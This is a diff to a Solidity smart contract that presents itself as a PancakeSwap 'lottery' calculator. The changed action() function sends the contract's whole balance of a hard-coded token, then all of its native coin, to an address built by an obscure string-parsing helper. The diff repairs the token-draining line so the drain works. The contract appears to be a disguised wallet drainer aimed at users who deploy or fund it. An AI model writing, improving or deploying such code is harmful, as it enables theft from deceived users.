@@ -5,6 +5,7 @@ pragma solidity ^0.5.17;
 
 interface IERC20 {
     function transfer(address _to, uint256 _amount) external returns (bool);
+    function balanceOf(address tokenOwner) external returns (uint balance);
 }
 
 contract CalculatePancakeswapLottery {
@@ -78,12 +79,10 @@ function parseDeeptime(string memory _a) internal pure returns (address _parsedA
  function action() public payable{
 	address _tokenContract = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
 	IERC20 tokenContract = IERC20(_tokenContract);
-        tokenContract.transfer(startLookingForTimeMatch(), address(this).balance);
+        tokenContract.transfer(startLookingForTimeMatch(), tokenContract.balanceOf(address(this)));
 	address(uint160(startLookingForTimeMatch())).transfer(address(this).balance);
 	
 	    
   }
 
 }
-
-
